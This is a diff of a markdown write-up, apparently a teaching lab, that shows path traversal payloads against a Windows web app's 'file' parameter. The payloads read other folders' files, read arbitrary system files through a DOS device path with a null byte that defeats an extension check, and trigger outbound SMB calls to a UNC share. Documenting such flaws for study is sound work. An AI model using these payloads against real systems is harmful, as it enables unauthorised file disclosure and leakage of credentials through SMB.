@@ -6,14 +6,29 @@ By using DOS device paths https://learn.microsoft.com/en-us/dotnet/standard/io/f
 
 ## Example payloads
 
-- `?file=\\?\c:\windows\win.ini%00`	# will read any file and due to the DOS device path enable the null character termination and bypass the `.md` file extension limitation.
+### Intended functionality
+
+- `?file=data`
+
+
+### Read secret in other folder same extension (md)
+Read any file with `.md` file extension.
+
+- `?file=file=..\secret\secret`	
+
+![image](img/secret.png)
+
+### Read any file on local system
+Read any file and due to the DOS device path enable the null character termination and bypass the `.md` file extension limitation.
+
+- `?file=\\?\c:\windows\win.ini%00`	
 
 ![image](img/local.png)
 
-## Making outbound SMB  connections 
+### Making outbound SMB connections 
+It is also possible to trigger the web application to make outgoing smb-calls by using payloads such as:
 
-It is also possible to trigger the web application to make outgoing smb-calls vy using payloads such as:
-
-- `\\.\UNC\server\share\file`	# will read `file.md` from the server share
+- `?file=\\.\UNC\server\share\file`	# will read `file.md` on the server share
+- `?file=\\?\UNC\server\share\secret.txt%00`	# will read `secret.txt` on the server share
 
 ![image](img/smb.png)
